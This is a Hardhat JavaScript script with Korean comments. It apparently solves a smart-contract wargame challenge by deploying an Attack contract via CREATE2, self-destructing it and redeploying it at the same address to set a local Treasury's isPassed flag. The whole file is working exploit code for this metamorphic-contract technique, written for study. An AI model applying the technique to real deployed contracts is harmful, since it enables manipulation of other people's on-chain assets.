const hre = require("hardhat");
const { ethers } = hre;

async function main() {
    console.log("🚀 Attack 스크립트 시작...");

    // 1. Treasury 컨트랙트 배포
    console.log("1️⃣ Treasury 컨트랙트 배포 중...");
    const Treasury = await ethers.getContractFactory("Treasury");
    const treasury = await Treasury.deploy();
    await treasury.waitForDeployment();
    const treasuryAddress = await treasury.getAddress();
    console.log("✅ Treasury 배포 완료:", treasuryAddress);

    // 2. Create2Deployer 배포
    console.log("2️⃣ Create2Deployer 컨트랙트 배포 중...");
    const Create2Deployer = await ethers.getContractFactory("Create2Deployer");
    const create2Deployer = await Create2Deployer.deploy();
    await create2Deployer.waitForDeployment();
    const create2DeployerAddress = await create2Deployer.getAddress();
    console.log("✅ Create2Deployer 배포 완료:", create2DeployerAddress);

    // 3. create2Deployer.getBytecode()로 Attack 컨트랙트 코드를 읽어온 후,
    //    salt는 "0x0000000000000000000000000000000000000000000000000000000000000001"
    //    이 값으로 해서 deployCreate2Assembly 호출
    console.log("3️⃣ Attack 컨트랙트를 CREATE2로 배포 중...");
    
    // Attack 컨트랙트의 bytecode 가져오기
    const Attack = await ethers.getContractFactory("Attack");
    const attackBytecode = await create2Deployer.getInitCode(treasuryAddress);
    console.log("📦 Attack bytecode 길이:", attackBytecode.length);

    // salt 설정
    const salt = "0x0000000000000000000000000000000000000000000000000000000000000001";
    console.log("🧂 사용할 salt:", salt);

    // 배포될 주소 미리 계산 (CREATE2 주소 계산)
    const deployerAddress = await create2Deployer.getAddress();
    const initCodeHash = ethers.keccak256(attackBytecode);
    
    // CREATE2 주소 계산: keccak256(0xff ++ deployerAddress ++ salt ++ keccak256(initCode))
    const create2Address = ethers.keccak256(
        ethers.concat([
            "0xff",
            deployerAddress,
            salt,
            initCodeHash
        ])
    );
    const attack1Address = ethers.getAddress(create2Address.slice(-40));
    console.log("📍 Attack1 예상 주소:", attack1Address);
    
    // deployCreate2Assembly 호출
    const deployTx = await create2Deployer.deployCreate2Assembly(salt, treasuryAddress);
    const deployReceipt = await deployTx.wait();
    console.log("✅ Attack 컨트랙트 배포 완료 (attack1)");

    // 5. attack1.firstStage 호출
    console.log("5️⃣ attack1.firstStage 호출 중...");
    const attack1 = Attack.attach(attack1Address);
    const firstStageTx = await attack1.firstStage();
    await firstStageTx.wait();
    console.log("✅ attack1.firstStage 호출 완료");

    // 6. attack1 destroy
    console.log("6️⃣ attack1 destroy 호출 중...");
    const destroyTx = await attack1.destroy();
    await destroyTx.wait();
    console.log("✅ attack1 destroy 완료");

    // 7. 같은 주소에 다시 배포 시도 (현재 이더리움에서는 실패할 수 있음)
    console.log("7️⃣ Attack 컨트랙트를 같은 주소에 다시 CREATE2 배포 시도 중 (attack2)...");
    
    // 같은 주소 사용
    const attack2Address = attack1Address;
    console.log("📍 Attack2 주소 (attack1과 동일):", attack2Address);
    
    // deployCreate2Assembly 호출 (두 번째) - 실패할 수 있음
    try {
        const deployTx2 = await create2Deployer.deployCreate2Assembly(salt, treasuryAddress);
        const deployReceipt2 = await deployTx2.wait();
        console.log("✅ Attack 컨트랙트 재배포 성공 (attack2)");
    } catch (error) {
        console.log("❌ Attack 컨트랙트 재배포 실패:", error.message);
        console.log("💡 이는 현재 이더리움에서 selfdestruct 후 재배포가 불가능하기 때문입니다.");
        console.log("💡 이 공격은 이전 버전의 이더리움에서만 작동합니다.");
        return;
    }

    // 8. attack2.secondStage 호출
    console.log("8️⃣ attack2.secondStage 호출 중...");
    const attack2 = Attack.attach(attack2Address);
    const secondStageTx = await attack2.secondStage();
    await secondStageTx.wait();
    console.log("✅ attack2.secondStage 호출 완료");

    // 9. Treasury의 isPassed가 값이 true로 바뀌어있음을 확인
    console.log("9️⃣ Treasury의 isPassed 상태 확인 중...");
    const isPassed = await treasury.isPassed();
    console.log("📊 Treasury.isPassed:", isPassed);
    
    if (isPassed) {
        console.log("🎉 성공! Treasury의 isPassed가 true로 설정되었습니다!");
    } else {
        console.log("❌ 실패! Treasury의 isPassed가 여전히 false입니다.");
    }

    console.log("\n📋 최종 결과:");
    console.log("🏦 Treasury 주소:", treasuryAddress);
    console.log("🔧 Create2Deployer 주소:", create2DeployerAddress);
    console.log("⚔️ Attack1 주소:", attack1Address);
    console.log("⚔️ Attack2 주소:", attack2Address);
    console.log("✅ isPassed 상태:", isPassed);

    console.log("\n🎯 공격 완료!");
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error("❌ 에러 발생:", error);
        process.exit(1);
    });

